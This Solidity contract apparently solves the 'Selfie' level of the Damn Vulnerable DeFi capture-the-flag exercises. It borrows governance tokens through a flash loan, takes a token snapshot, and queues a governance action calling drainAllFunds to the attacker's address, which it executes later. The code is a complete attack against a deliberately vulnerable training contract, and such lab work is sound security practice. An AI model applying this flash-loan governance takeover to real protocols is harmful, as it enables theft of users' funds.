// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract HackSelfiePool {
    DamnValuableTokenSnapshot token;
    SelfiePool public pool;
    SimpleGovernance public governance;
    address owner;
    uint256 actionId;

    constructor(address tokenAddress, address poolAddress, address governanceAddress) {
        token = DamnValuableTokenSnapshot(tokenAddress);
        pool = SelfiePool(poolAddress);
        governance = SimpleGovernance(governanceAddress);
        owner = msg.sender;
    }

    function hack(uint256 amount) external {
        pool.flashLoan(amount);
    }

    function withdraw() external {
        governance.executeAction(actionId);
    }

    function receiveTokens(address, uint256 amount) external {
        token.snapshot();

        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            owner
        );

        actionId = governance.queueAction(
            address(pool), // receiver
            data, //data
            0 // weiAmount
        );

        token.transfer(address(pool), amount);
    }
}
